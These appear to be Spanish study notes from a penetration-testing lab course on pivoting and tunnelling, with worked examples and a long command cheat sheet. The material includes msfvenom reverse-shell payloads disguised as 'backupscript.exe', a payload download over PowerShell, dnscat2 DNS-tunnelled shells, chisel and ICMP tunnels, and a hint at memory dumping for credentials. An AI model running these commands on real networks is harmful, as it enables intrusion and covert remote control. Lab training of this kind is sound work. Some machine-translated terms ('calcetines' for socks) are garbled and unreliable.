![[Pasted image 20240605151052.png]]
#### Ejecución del reenvío de puerto local por ssh
```python
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

#### Reenvío de múltiples puertos

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

#### Habilitación del reenvío dinámico de puertos con SSH

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
G41i130Q@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64

	# nota: de esta manera podemos enviar todo el trafico de la maquina numero 3 (maquina final) hacia nuestra maquina por el puerto 9050 que esta configurado usando el proxychains
```

#### Enumeración del destino de Windows a través de Proxychains

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
proxychains nmap -v -Pn -sT 172.16.5.19
```

#### Usando xfreerdp con Proxychains

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

#### Configuración del proxy SOCKS de MSF

Túneles y reenvío de puertos de Meterpreter

```python
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

Después de iniciar el servidor SOCKS, configuraremos cadenas proxy para enrutar el tráfico generado por otras herramientas como Nmap a través de nuestro pivote en el host Ubuntu comprometido. Podemos agregar la siguiente línea al final de nuestro `proxychains.conf` archivo ubicado en `/etc/proxychains.conf` si no está ya allí.

#### Agregar una línea a proxychains.conf si es necesario

Túneles y reenvío de puertos de Meterpreter

```shell-session
socks4 	127.0.0.1 9050
```

Nota: Dependiendo de la versión que esté ejecutando el servidor SOCKS, es posible que ocasionalmente necesitemos cambiar calcetines4 a calcetines5 en proxychains.conf.

Finalmente, necesitamos decirle a nuestro módulo calcetines_proxy que enrute todo el tráfico a través de nuestra sesión de Meterpreter. Podemos usar el `post/multi/manage/autoroute` Módulo de Metasploit para agregar rutas para la subred 172.16.5.0 y luego enrutar todo el tráfico de nuestras cadenas de proxy.

#### Crear rutas con AutoRoute

Túneles y reenvío de puertos de Meterpreter

```python
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

También es posible agregar rutas con autorruta ejecutando autoroute desde la sesión de Meterpreter.

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

Después de agregar las rutas necesarias, podemos usar el `-p` opción para enumerar las rutas activas para asegurarnos de que nuestra configuración se aplique como se esperaba.

#### Listado de rutas activas con AutoRoute

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

Como puede ver en el resultado anterior, la ruta se agregó a la red 172.16.5.0/23. Ahora podremos usar cadenas proxy para enrutar nuestro tráfico de Nmap a través de nuestra sesión de Meterpreter.

#### Prueba de funcionalidad de enrutamiento y proxy

Túneles y reenvío de puertos de Meterpreter

```python
G41i130Q@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
Initiating Connect Scan at 13:40
Scanning 172.16.5.19 [1 port]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
Nmap scan report for 172.16.5.19 
Host is up (0.12s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

#### Opciones de puerto

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

#### Creación de retransmisión TCP local

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

El comando anterior solicita a la sesión de Meterpreter que inicie un detector en el puerto local de nuestro host de ataque ( `-l`) `3300` y reenviar todos los paquetes al control remoto ( `-r`) Servidor de windows `172.16.5.19` en `3389` puerto ( `-p`) a través de nuestra sesión de Meterpreter. Ahora, si ejecutamos xfreerdp en nuestro localhost:3300, podremos crear una sesión de escritorio remoto.

#### Conexión a Windows Target a través de localhost

Túneles y reenvío de puertos de Meterpreter

```python
G41i130Q@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

## Reenvío de puerto inverso de Meterpreter

De manera similar a los reenvíos de puertos locales, Metasploit también puede realizar `reverse port forwarding`con el siguiente comando, donde es posible que desee escuchar en un puerto específico en el servidor comprometido y reenviar todos los shells entrantes desde el servidor Ubuntu a nuestro host de ataque. Iniciaremos un escucha en un nuevo puerto en nuestro host de ataque para Windows y solicitaremos al servidor Ubuntu que reenvíe todas las solicitudes recibidas al servidor Ubuntu en el puerto. `1234` a nuestro oyente en el puerto `8081`.

Podemos crear un puerto inverso hacia adelante en nuestro shell existente del escenario anterior usando el siguiente comando. Este comando reenvía todas las conexiones en el puerto `1234` ejecutándose en el servidor Ubuntu a nuestro host de ataque en el puerto local ( `-l`) `8081`. También configuraremos nuestro oyente para escuchar en el puerto 8081 para un shell de Windows.

#### Reglas de reenvío de puertos inversos

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

#### Configuración e inicio de multi/handler

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

Ahora podemos crear una carga útil de shell inverso que enviará una conexión de regreso a nuestro servidor Ubuntu en `172.16.5.129`: `1234`cuando se ejecuta en nuestro host de Windows. Una vez que nuestro servidor Ubuntu reciba esta conexión, la reenviará a `attack host's ip`: `8081` que configuramos.

#### Generando la carga útil de Windows

Túneles y reenvío de puertos de Meterpreter

```python
G41i130Q@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Finalmente, si ejecutamos nuestra carga útil en el host de Windows, deberíamos poder recibir un shell de Windows pivotado a través del servidor Ubuntu.

#### Estableciendo la sesión de Meterpreter

Túneles y reenvío de puertos de Meterpreter

```python
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

# Reenvío de puertos con Windows Netsh

#### Usando Netsh.exe para reenviar puertos

Reenvío de puertos con Windows Netsh

```python
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

#### Verificación de reenvío de puerto

Reenvío de puertos con Windows Netsh

```python
netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.25     3389
```

Después de configurar el `portproxy`En nuestro host pivot basado en Windows, intentaremos conectarnos al puerto 8080 de este host desde nuestro host de ataque usando xfreerdp. Una vez que se envía una solicitud desde nuestro host de ataque, el host de Windows enrutará nuestro tráfico de acuerdo con la configuración del proxy configurada por netsh.exe.

### Hoja de Comandos

| Dominio                                                                                                                                                                                                            | Descripción                                                                                                                                                                                                                                                                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ifconfig`                                                                                                                                                                                                         | Comando basado en Linux que muestra todas las configuraciones de red actuales de un sistema.                                                                                                                                                                                                          |
| `ipconfig`                                                                                                                                                                                                         | Comando basado en Windows que muestra todas las configuraciones de red del sistema.                                                                                                                                                                                                                   |
| `netstat -r`                                                                                                                                                                                                       | Comando utilizado para mostrar la tabla de enrutamiento para todos los protocolos basados ​​en IPv4.                                                                                                                                                                                                  |
| `nmap -sT -p22,3306 <IPaddressofTarget>`                                                                                                                                                                           | Comando Nmap utilizado para escanear un destino en busca de puertos abiertos que permitan conexiones SSH o MySQL.                                                                                                                                                                                     |
| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>`                                                                                                                                                            | Comando SSH utilizado para crear un túnel SSH desde una máquina local en el puerto local `1234` a un destino remoto mediante el puerto 3306.                                                                                                                                                          |
| `netstat -antp \| grep 1234`                                                                                                                                                                                       | Opción Netstat utilizada para mostrar las conexiones de red asociadas con un túnel creado. Usando `grep` para filtrar según el puerto local `1234` .                                                                                                                                                  |
| `nmap -v -sV -p1234 localhost`                                                                                                                                                                                     | Comando Nmap utilizado para escanear un host a través de una conexión que se ha realizado en el puerto local `1234`.                                                                                                                                                                                  |
| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>`                                                                                                                                          | Comando SSH que indica al cliente ssh que solicite al servidor SSH que reenvíe todos los datos a través del puerto `1234` a `localhost:3306`.                                                                                                                                                         |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                           | Comando SSH utilizado para realizar un reenvío dinámico de puerto en el puerto `9050`y establece un túnel SSH con el objetivo. Esto es parte de la configuración de un proxy SOCKS.                                                                                                                   |
| `tail -4 /etc/proxychains.conf`                                                                                                                                                                                    | Comando basado en Linux utilizado para mostrar las últimas 4 líneas de /etc/proxychains.conf. Se puede utilizar para garantizar que las configuraciones de los calcetines estén en su lugar.                                                                                                          |
| `proxychains nmap -v -sn 172.16.5.1-200`                                                                                                                                                                           | Se utiliza para enviar el tráfico generado por un escaneo de Nmap a través de Proxychains y un proxy SOCKS. El escaneo se realiza contra los hosts en el rango especificado `172.16.5.1-200` con mayor verbosidad ( `-v`) deshabilitar el escaneo de ping ( `-sn`).                                   |
| `proxychains nmap -v -Pn -sT 172.16.5.19`                                                                                                                                                                          | Se utiliza para enviar el tráfico generado por un escaneo de Nmap a través de Proxychains y un proxy SOCKS. El escaneo se realiza contra 172.16.5.19 con mayor detalle ( `-v`), deshabilitar el descubrimiento de ping ( `-Pn`), y utilizando el tipo de escaneo de conexión TCP ( `-sT`).            |
| `proxychains msfconsole`                                                                                                                                                                                           | Utiliza Proxychains para abrir Metasploit y enviar todo el tráfico de red generado a través de un proxy SOCKS.                                                                                                                                                                                        |
| `msf6 > search rdp_scanner`                                                                                                                                                                                        | Búsqueda de Metasploit que intenta encontrar un módulo llamado `rdp_scanner`.                                                                                                                                                                                                                         |
| `proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123`                                                                                                                                                | Se utiliza para conectarse a un objetivo mediante RDP y un conjunto de credenciales mediante cadenas proxy. Esto enviará todo el tráfico a través de un proxy SOCKS.                                                                                                                                  |
| `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`                                                                                            | Utiliza msfvenom para generar una carga útil HTTPS Meterpreter inversa basada en Windows que enviará una llamada a la dirección IP especificada a continuación `lhost=` en el puerto local 8080 ( `LPORT=8080`). La carga útil tomará la forma de un archivo ejecutable llamado `backupscript.exe`.   |
| `msf6 > use exploit/multi/handler`                                                                                                                                                                                 | Se utiliza para seleccionar el módulo de explotación de múltiples controladores en Metasploit.                                                                                                                                                                                                        |
| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`                                                                                                                                                               | Utiliza protocolo de copia segura ( `scp`) para transferir el archivo `backupscript.exe` al host especificado y lo coloca en el directorio de inicio del usuario de Ubuntu ( `:~/`).                                                                                                                  |
| `python3 -m http.server 8123`                                                                                                                                                                                      | Utiliza Python3 para iniciar un servidor HTTP simple que escucha en el puerto `8123`. Se puede utilizar para recuperar archivos de un host.                                                                                                                                                           |
| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`                                                                                                                | Comando de PowerShell utilizado para descargar un archivo llamado backupscript.exe desde un servidor web ( `172.16.5.129:8123`) y luego guarde el archivo en la ubicación especificada después `-OutFile`.                                                                                            |
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN`                                                                                                                                    | Comando SSH utilizado para crear un túnel SSH inverso desde un objetivo a un host de ataque. El tráfico se reenvía en el puerto. `8080` en el host de ataque al puerto `80` en el objetivo.                                                                                                           |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080`                                                                                                        | Utiliza msfveom para generar una carga útil TCP inversa de Meterpreter basada en Linux que vuelve a llamar a la IP especificada después `LHOST=` en el puerto 8080 ( `LPORT=8080`). La carga útil toma la forma de un archivo elf ejecutable llamado backupjob.                                       |
| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`                                                                                                                                                      | Comando Metasploit que ejecuta un módulo de barrido de ping contra el segmento de red especificado ( `RHOSTS=172.16.5.0/23`).                                                                                                                                                                         |
|                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                                                       |
| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done`                                                                                                                                       | For Loop se utiliza en un sistema basado en Linux para descubrir dispositivos en un segmento de red específico.                                                                                                                                                                                       |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"`                                                                                                                                           | For Loop se utiliza en un sistema basado en Windows para descubrir dispositivos en un segmento de red específico.                                                                                                                                                                                     |
| `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}`                                                                                                                          | Una línea de PowerShell utilizada para hacer ping a las direcciones 1 a 254 en el segmento de red especificado.                                                                                                                                                                                       |
| `msf6 > use auxiliary/server/socks_proxy`                                                                                                                                                                          | Comando Metasploit que selecciona el `socks_proxy` módulo auxiliar.                                                                                                                                                                                                                                   |
| `msf6 auxiliary(server/socks_proxy) > jobs`                                                                                                                                                                        | Comando Metasploit que enumera todos los trabajos actualmente en ejecución.                                                                                                                                                                                                                           |
| `socks4 127.0.0.1 9050`                                                                                                                                                                                            | Línea de texto que debe agregarse a /etc/proxychains.conf para garantizar que se utilice un proxy SOCKS versión 4 en combinación con proxychains en la dirección IP y el puerto especificados.                                                                                                        |
| `Socks5 127.0.0.1 1080`                                                                                                                                                                                            | Línea de texto que debe agregarse a /etc/proxychains.conf para garantizar que se utilice un proxy SOCKS versión 5 en combinación con proxychains en la dirección IP y el puerto especificados.                                                                                                        |
| `msf6 > use post/multi/manage/autoroute`                                                                                                                                                                           | Comando Metasploit utilizado para seleccionar el módulo de autopista.                                                                                                                                                                                                                                 |
|                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                                                       |
| `meterpreter > help portfwd`                                                                                                                                                                                       | Comando meterpreter utilizado para mostrar las características del comando portfwd.                                                                                                                                                                                                                   |
| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>`                                                                                                                                                 | Comando portfwd basado en Meterpreter que agrega una regla de reenvío a la sesión actual de Meterpreter. Esta regla reenvía el tráfico de red en el puerto 3300 de la máquina local al puerto 3389 (RDP) del destino.                                                                                 |
| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`                                                                                                                                                                 | Utiliza xfreerdp para conectarse a un host remoto a través de localhost:3300 usando un conjunto de credenciales. Deben existir reglas de reenvío de puertos para que esto funcione correctamente.                                                                                                     |
| `netstat -antp`                                                                                                                                                                                                    | Se utiliza para mostrar todo ( `-a`) conexiones de red activas con ID de proceso asociados. `-t` muestra sólo conexiones TCP. `-n` muestra sólo direcciones numéricas. `-p` muestra los ID de proceso asociados con cada conexión mostrada.                                                           |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>`                                                                                                                                          | Comando portfwd basado en Meterpreter que agrega una regla de reenvío que dirige el tráfico que ingresa por el puerto 8081 al puerto `1234` escuchando en la dirección IP del host de ataque.                                                                                                         |
| `meterpreter > bg`                                                                                                                                                                                                 | Comando basado en Meterpreter utilizado para ejecutar la sesión de metepreter seleccionada en segundo plano. Similar al proceso en segundo plano en Linux                                                                                                                                             |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80`                                                                                                                                                      | Utiliza Socat para escuchar en el puerto 8080 y luego bifurcarse cuando se recibe la conexión. Luego se conectará al host del ataque en el puerto 80.                                                                                                                                                 |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443`                                                                                                                                                        | Utiliza Socat para escuchar en el puerto 8080 y luego bifurcarse cuando se recibe la conexión. Luego se conectará al host de destino en el puerto 8443.                                                                                                                                               |
| `plink -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                         | Comando basado en Windows que utiliza Plink.exe de PuTTY para realizar el reenvío dinámico de puertos SSH y establece un túnel SSH con el destino especificado. Esto permitirá el encadenamiento de proxy en un host de Windows, similar a lo que se hace con Proxychains en un host basado en Linux. |
| `sudo apt-get install sshuttle`                                                                                                                                                                                    | Utiliza apt-get para instalar la herramienta sshuttle.                                                                                                                                                                                                                                                |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`                                                                                                                                                              | Ejecuta sshuttle, se conecta al host de destino y crea una ruta a la red 172.16.5.0 para que el tráfico pueda pasar desde el host de ataque a los hosts de la red interna ( `172.16.5.0`).                                                                                                            |
| `sudo git clone https://github.com/klsecservices/rpivot.git`                                                                                                                                                       | Clona el repositorio de GitHub del proyecto rpivot.                                                                                                                                                                                                                                                   |
| `sudo apt-get install python2.7`                                                                                                                                                                                   | Utiliza apt-get para instalar python2.7.                                                                                                                                                                                                                                                              |
| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`                                                                                                                                     | Se utiliza para ejecutar el servidor rpivot ( `server.py`) en el puerto proxy `9050`, Puerto de servicio `9999` y escuchando en cualquier dirección IP ( `0.0.0.0`).                                                                                                                                  |
| `scp -r rpivot ubuntu@<IPaddressOfTarget>`                                                                                                                                                                         | Utiliza un protocolo de copia segura para transferir un directorio completo y todo su contenido a un destino específico.                                                                                                                                                                              |
| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`                                                                                                                                                   | Se utiliza para ejecutar el cliente rpivot ( `client.py`) para conectarse al servidor rpivot especificado en el puerto apropiado.                                                                                                                                                                     |
| `proxychains firefox-esr <IPaddressofTargetWebServer>:80`                                                                                                                                                          | Abre Firefox con Proxychains y envía la solicitud web a través de un servidor proxy SOCKS al servidor web de destino especificado.                                                                                                                                                                    |
| `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>` | Úselo para ejecutar el cliente rpivot para conectarse a un servidor web que utiliza HTTP-Proxy con autenticación NTLM.                                                                                                                                                                                |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25`                                                                                 | Comando basado en Windows que utiliza `netsh.exe` para configurar una regla portproxy llamada `v4tov4` que escucha en el puerto 8080 y reenvía conexiones al destino 172.16.5.25 en el puerto 3389.                                                                                                   |
| `netsh.exe interface portproxy show v4tov4`                                                                                                                                                                        | Comando basado en Windows utilizado para ver las configuraciones de una regla de portproxy llamada v4tov4.                                                                                                                                                                                            |
| `git clone https://github.com/iagox86/dnscat2.git`                                                                                                                                                                 | Clona el `dnscat2` Repositorio GitHub del proyecto.                                                                                                                                                                                                                                                   |
| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`                                                                                                                        | Se utiliza para iniciar el servidor dnscat2.rb ejecutándose en la dirección IP especificada, puerto ( `53`) y usando el dominio `inlanefreight.local` con la opción sin caché habilitada.                                                                                                             |
| `git clone https://github.com/lukebaggett/dnscat2-powershell.git`                                                                                                                                                  | Clona el repositorio Github del proyecto dnscat2-powershell.                                                                                                                                                                                                                                          |
| `Import-Module dnscat2.ps1`                                                                                                                                                                                        | Comando de PowerShell utilizado para importar la herramienta dnscat2.ps1.                                                                                                                                                                                                                             |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd`                                                                                     | Comando de PowerShell utilizado para conectarse a un servidor dnscat2 específico mediante una dirección IP, un nombre de dominio y un secreto previamente compartido. El cliente devolverá una conexión de shell al servidor ( `-Exec cmd`).                                                          |
| `dnscat2> ?`                                                                                                                                                                                                       | Se utiliza para enumerar las opciones de dnscat2.                                                                                                                                                                                                                                                     |
| `dnscat2> window -i 1`                                                                                                                                                                                             | Se utiliza para interactuar con una sesión dnscat2 establecida.                                                                                                                                                                                                                                       |
| `./chisel server -v -p 1234 --socks5`                                                                                                                                                                              | Se utiliza para iniciar un servidor chisel en modo detallado escuchando en el puerto `1234` usando SOCKS versión 5.                                                                                                                                                                                   |
| `./chisel client -v 10.129.202.64:1234 socks`                                                                                                                                                                      | Se utiliza para conectarse a un servidor chisel en la dirección IP y el puerto especificados mediante calcetines.                                                                                                                                                                                     |
| `git clone https://github.com/utoni/ptunnel-ng.git`                                                                                                                                                                | Clona el repositorio de GitHub del proyecto ptunnel-ng.                                                                                                                                                                                                                                               |
| `sudo ./autogen.sh`                                                                                                                                                                                                | Se utiliza para ejecutar el script de shell autogen.sh que creará los archivos ptunnel-ng necesarios.                                                                                                                                                                                                 |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22`                                                                                                                                                                           | Se utiliza para iniciar el servidor ptunnel-ng en la dirección IP especificada ( `-r`) y puerto correspondiente ( `-R22`).                                                                                                                                                                            |
| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22`                                                                                                                                                    | Se utiliza para conectarse a un servidor ptunnel-ng específico a través del puerto local 2222 ( `-l2222`).                                                                                                                                                                                            |
| `ssh -p2222 -lubuntu 127.0.0.1`                                                                                                                                                                                    | Comando SSH utilizado para conectarse a un servidor SSH a través de un puerto local. Esto se puede utilizar para canalizar el tráfico SSH a través de un túnel ICMP.                                                                                                                                  |
| `regsvr32.exe SocksOverRDP-Plugin.dll`                                                                                                                                                                             | Comando basado en Windows utilizado para registrar SocksOverRDP-PLugin.dll.                                                                                                                                                                                                                           |
| `netstat -antb \|findstr 1080`                                                                                                                                                                                     | Comando basado en Windows utilizado para enumerar las conexiones de red TCP que escuchan en el puerto 1080.                                                                                                                                                                                           |

### creando un dump file a partir de un proceso del administrador de tareas

creamos el archivo y luego con la herramienta pypykatz podemos verlo
![[Pasted image 20240606145302.png]]

